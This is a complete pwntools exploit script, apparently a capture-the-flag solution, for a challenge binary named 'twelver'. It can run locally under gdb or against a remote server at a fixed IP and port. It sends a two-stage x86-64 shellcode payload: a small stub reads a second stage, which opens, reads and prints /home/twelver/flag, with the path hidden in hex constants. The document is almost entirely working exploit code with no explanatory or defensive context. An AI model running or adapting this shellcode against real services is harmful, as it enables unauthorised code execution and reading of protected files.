#!/usr/bin/python

from pwn import *

def exploit():
	r.sendafter("> ",asm("""
		lea rsi, [rip-0x1]
		mov dl, 0x7f
		syscall
	"""))

	r.send('\x90'*7 + asm("""
		lea rsp, [rip+0x800]
		
		push 0x1010101 ^ 0x6761
		xor dword ptr [rsp], 0x1010101
		mov rax, 0x6c662f7265766c65
		push rax
		mov rax, 0x77742f656d6f682f
		push rax

		mov rdi, rsp
		xor edx, edx
		xor esi, esi
		xor eax, eax
		mov al, 2
		syscall

		xchg rax, rdi
		mov rsi, rsp
		mov dl, 0x70
		xor eax, eax
		syscall

		xchg rax, rdx
		mov rdi, 1
		push rdi
		pop rax
		syscall

		mov al, 0x3c
		xor edi, edi
		syscall
	""").ljust(0x7f,'\x90'))
	r.interactive()

# context.log_level = "debug"
context.arch = "amd64"
exe = ELF("./twelver")

if len(sys.argv) < 2:
	r = process(exe.path)
	gdb.attach(r,"""
		pie break *0xca2
		c
	""")
else:
	r = remote("128.199.101.63",11114)

exploit()